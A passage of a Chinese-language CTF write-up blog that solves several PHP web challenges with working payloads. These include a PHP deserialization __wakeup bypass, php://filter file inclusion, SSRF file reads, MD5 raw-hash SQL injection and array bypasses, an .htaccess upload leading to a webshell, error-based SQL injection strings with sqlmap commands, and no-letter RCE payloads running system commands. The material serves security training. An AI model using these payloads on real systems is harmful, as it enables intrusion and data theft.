punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"wllm"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No wake up"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token variable">$Letmeseesee</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$Letmeseesee</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>与<strong> ez_unserialize</strong> 类似，但多出来一个____wakeup () 函数，php 在执行 unserialize () 函数前，会执行这个函数</p><p>所以会将密码进行 sha1 加密，而 sha1 是不可逆加密算法，目前也没有合适的 sha1 碰撞方式，从函数上考虑绕过有些困难，故考虑绕过__wakeup () 函数。</p><p>绕过的方法也很简单，只需要将序列化字符串表示对象属性个数的值大于真实的属性个数时，由于与反序列化的规则不符，就会反序列化失败，因此不会执行__wakeup ()，但是__destruct () 仍然可以执行。</p><p><strong>注：</strong><br>或许你会疑惑：<br><strong>明明无法完成反序列化，为什么还可以触发__destruct ()，为什么还能够对属性赋值？</strong></p><p>你可以这样理解：<br>反序列化是一个正向检索的函数，虽然对于整体来说，数量不符，无法完成反序列化，但是可以尽可能检索能够完成反序列化的目标，所以这里数量改为了 3，会先依次反序列化 2 个单位，直到无法检索到第 3 个目标才判定反序列化失败。<br>所以当然可以触发__destruct (), 完成前面属性的赋值。</p><p>在<strong> ez_unserialize</strong> 的 payload 稍做修改：</p><blockquote s:5:admin;s:5:admin;s:6:passwd;s:4:wllm;=""><p>?p=O:6:&quot;HaHaHa&quot;:3:</p></blockquote><p>得到 flag。</p><h3 id="swpuctf-2021-新生赛pseudoprotocols"><a class="anchor" href="#swpuctf-2021-新生赛pseudoprotocols">#</a> [SWPUCTF 2021 新生赛] PseudoProtocols</h3><blockquote><p>PHP 伪协议，文件包含，</p></blockquote><blockquote><p>hint is hear Can you find out the hint.php?</p></blockquote><p>进去后提示我们查看 hint.php，用 php 伪协议查看：</p><blockquote><p>?wllm=php://filter/convert.base64-encode/resource=hint.php</p></blockquote><p>解码：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//go to /test2222222222222.php</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>访问 /test2222222222222.php</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"max_execution_time"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"180"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$a</span><span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'I want flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"success\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>用 data 协议写入即可。</p><h3 id="nisactf-2022easyssrf"><a class="anchor" href="#nisactf-2022easyssrf">#</a> [NISACTF 2022]easyssrf</h3><blockquote><p>php 伪协议，ssrf, 目录穿越</p></blockquote><p>进去后有个让我们 curl 的框，随便输入一个百度官网，发现可以回显。</p><p>输入：</p><blockquote><p>file:///etc/passwd</p></blockquote><p>返回：</p><blockquote><p>害羞羞，试试其他路径？</p></blockquote><p>可以判断出 file 协议可以用但是读取不了这个文件。</p><p>尝试有没有 flag 文件：</p><blockquote><p>file:///flag</p></blockquote><p>返回：</p><blockquote><p>都说了这里看不了 flag。。但是可以看看提示文件：/fl4g</p></blockquote><p>输入：</p><blockquote><p>file:///fl4g</p></blockquote><p>返回：</p><blockquote><p>你应该看看除了 index.php，是不是还有个 ha1x1ux1u.php</p></blockquote><p>访问这个文件，代码如下：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你败了."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">//flag in /flag</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>过滤了 file 协议，不过提示 flag 在 /flag 中，直接</p><blockquote><p>?file=/flag</p></blockquote><p>得到 flag。</p><h3 id="bjdctf-2020easy_md5"><a class="anchor" href="#bjdctf-2020easy_md5">#</a> [BJDCTF 2020]easy_md5</h3><blockquote><p>数组绕过，PHP 代码审计，弱比较，md5 绕过</p></blockquote><p>打开后是个输入框，尝试进行 SQL 注入，注入了半天没啥用。</p><p>换个思路，抓个包看看响应包里面有没有什么有用的信息。</p><p>得到一串代码：</p><blockquote><p>hint: select * from 'admin' where password=md5($pass,true)</p></blockquote><p>这句话可以用下面这个绕过：</p><h5 id="md5-sql注入"><a class="anchor" href="#md5-sql注入">#</a> MD5-SQL 注入</h5><blockquote><p>ffifdyop 的 MD5 加密结果是 276f722736c95d99e921722cf9ed621c</p><p>经过 MySQL 编码后会变成 'or'6xxx, 使 SQL 恒成立，相当于万能密码，可以绕过 md5 () 函数的加密</p></blockquote><p>该字符串 md5 加密后若 raw 参数为 True 时会返回 'or’6 (其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为 True，后面的会在 MySQL 将其转换成整型比较时丢掉)</p><p>在 mysql 里面，在用作布尔型判断时，以非 0 数字开头的字符串会被当做整型数。</p><p>相当于 password=‘xxx’ or 1</p><p>进入下一阶段：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: levell14.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure><p>这里有两种思路，一种就是 0e 绕过，另一种就是数组绕过。</p><h5 id="常用的md5加密后以0e开头的有"><a class="anchor" href="#常用的md5加密后以0e开头的有">#</a> 常用的 MD5 加密后以 0E 开头的有</h5><blockquote><p>QNKCDZO<br>240610708<br>byGcY<br>sonZ7y<br>aabg7XSs<br>aabC9RqS<br>s878926199a<br>s155964671a<br>s214587387a<br>s1091221200a</p></blockquote><h5 id="数组绕过"><a class="anchor" href="#数组绕过">#</a> 数组绕过</h5><blockquote><p>md5 不能加密数组，传入数组会报错，但会继续执行并且返回结果为 null</p></blockquote><p>这里我们用数组绕过：</p><blockquote><p>?a[]=1&amp;b[]=2</p></blockquote><p>进入最后阶段：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里是 md5 的强类型比较，0e 绕过就失去了效果，但数组绕过依然有效，</p><blockquote><p>param1[]=1&amp;param2[]=2</p></blockquote><p>或者可以尝试 md5 碰撞，这里就不尝试了。</p><h3 id="swpuctf-2021-新生赛easyupload30"><a class="anchor" href="#swpuctf-2021-新生赛easyupload30">#</a> [SWPUCTF 2021 新生赛] easyupload3.0</h3><blockquote><p>.htaccess, 文件上传</p></blockquote><p>打开题目后，有个传文件的框 ，查看网页源代码，可以看到有串提示：</p><blockquote><p>试试和某些文件配合哦～</p></blockquote><h5 id="htaccess文件"><a class="anchor" href="#htaccess文件">#</a> .htaccess 文件</h5><blockquote><p>htaccess 在站点的根目录下面，不是在<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1hcGFjaGUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw"> apache</span> 目录下，但是它属于 apache 的一个配置文件</p></blockquote><p>taccess 文件时 Apache 服务中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮助我们实现：网页 301 重定向、自定义 404 错误页面，改变文件扩展名、允许 / 阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</p><p>其中.htaccess 文件内容：SetHandler application/x-http-php 的意思是设置当前目录所有文件都使用 php 解析，那么无论上传任何文件，只要符合 php 语言代码规范，就会被当做 PHP 执行。不符合规则则报错</p><h5 id="httpconf文件前提条件"><a class="anchor" href="#httpconf文件前提条件">#</a> http.conf 文件 (前提条件)</h5><p>在此文件中设置 AllowOverried All ，才能使用.htaccess 文件</p><p>值得一提的是.htaccess 只对<strong>该文件所在的目录</strong>下的文件起作用。</p><p>这题目看到使用的是 apach 服务器，自然想到了.htaccess 文件，因此尝试上传</p><blockquote><p>AddType application/x-httpd-php .php .jpg .png .gif<br>SetHandler application/x-httpd-php</p></blockquote><p>成功上传后，再上传图片后缀的一句话木马，最后与蚁剑连接即可获得 flag。</p><h3 id="swpuctf-2021-新生赛error"><a class="anchor" href="#swpuctf-2021-新生赛error">#</a> [SWPUCTF 2021 新生赛] error</h3><blockquote><p>报错注入，SQL 注入</p></blockquote><p>很基础的报错注入，需要稍微注意的是最后得用字符串截取函数显现完整的 flag。</p><blockquote><p>爆出数据库名字 -1'and (select extractvalue (1,concat ('~',(select database ()))))#	报错注入</p></blockquote><blockquote><p>爆出所有数据库名 -1'and (select extractvalue (1,concat ('~',(select group_concat (schema_name) from information_schema.schemata))))#</p></blockquote><blockquote><p>爆出数据库 test_db 下所有的表 -1'and (select extractvalue (1,concat ('~',(select group_concat (table_name) from information_schema.tables where table_schema='test_db'))))#</p></blockquote><blockquote><p>爆出 test_db 数据库下 test_tb 表所有的列名 -1'and (select extractvalue (1,concat ('~',(select group_concat (column_name) from information_schema.columns where table_name=&quot;test_tb&quot; and table_schema='test_db'))))#</p></blockquote><blockquote><p>查询 flag -1'and (select extractvalue (1,concat ('~',(select substr ((select flag from test_tb), 1 , 31)))))# 0-30 位 左边 30 位 -1'and (select extractvalue (1,concat ('~',(select substr ((select flag from test_tb), 31 , 60)))))# 31-60 位 右边边 31 位</p></blockquote><p>或者还可以用 sqlmap 去做：</p><blockquote><p>sqlmap -u <span class="exturl" data-url="aHR0cDovL25vZGUxLmFubmEubnNzY3RmLmNuOjI4ODk0Lz9pZD0x">http://node1.anna.nssctf.cn:28894/?id=1</span> --dbs // 得到库名</p><p>sqlmap -u <span class="exturl" data-url="aHR0cDovL25vZGUxLmFubmEubnNzY3RmLmNuOjI4ODk0Lz9pZD0x">http://node1.anna.nssctf.cn:28894/?id=1</span> -D test_db --tables // 得到表名</p><p>sqlmap -u <span class="exturl" data-url="aHR0cDovL25vZGUxLmFubmEubnNzY3RmLmNuOjI4ODk0Lz9pZD0x">http://node1.anna.nssctf.cn:28894/?id=1</span> -D test_db -T test_tb --columns // 得到列名</p><p>sqlmap -u <span class="exturl" data-url="aHR0cDovL25vZGUxLmFubmEubnNzY3RmLmNuOjI4ODk0Lz9pZD0x">http://node1.anna.nssctf.cn:28894/?id=1</span> -D test_db -T test_tb -C flag --dump // 输出 FLAG</p></blockquote><p>&lt;!-- toc --&gt;</p><h3 id="swpuctf-2021-新生赛hardrce"><a class="anchor" href="#swpuctf-2021-新生赛hardrce">#</a> [SWPUCTF 2021 新生赛] hardrce</h3><blockquote><p>waf 绕过，无字母 rce</p></blockquote><p>做此题前可以先看看一下文档</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTA0NjMxMTQy">php 代码执行的各种绕过姿势</span></p><p>进入题目：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'wllm'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$wllm</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'wllm'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\+'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\-'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\*'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\?'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\&lt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\>'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\='</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\`'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"LTLT说不能用这些奇奇怪怪的符号哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/is'</span><span class="token punctuation">,</span><span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Ra's Al Ghul说不能用字母哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">echo</span> <span class="token string double-quoted-string">"NoVic4说：不错哦小伙子，可你能拿到flag吗？"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$wllm</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">else</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"蔡总说：注意审题！！！"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>过滤了很多字符，常规的无字母 RCE 主要有三种方式：</p><ol><li>异或</li><li>自增</li><li>取反</li></ol><p>异或、自增全 g 了，使用取反。</p><p>取反脚本：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>先使用 <code>system(&quot;ls /&quot;)</code> ；命令查看</p><p>有哪些文件</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>得到</p><blockquote><p>%8C%86%8C%8B%9A%92<br>%93%8C%DF%D0</p></blockquote><p>于是构造 payload:</p><blockquote><p>?wllm=(<sub>%8C%86%8C%8B%9A%92)(</sub>%93%8C%DF%D0);</p></blockquote><p>可知有个 /flllllaaaaaaggggggg 文件，</p><p>再次使用脚本：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cat /fl*"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>得到</p><blockquote><p>%8C%86%8C%8B%9A%92<br>%DF%9C%9E%8B%DF%D0%99%93%D5</p></blockquote><p>构造 payload:</p><blockquote><p>?wllm=(<sub>%8C%86%8C%8B%9A%92)(</sub>%DF%9C%9E%8B%DF%D0%99%93%D5)</p></blockquote><p>最终得到 flag。</p><h3 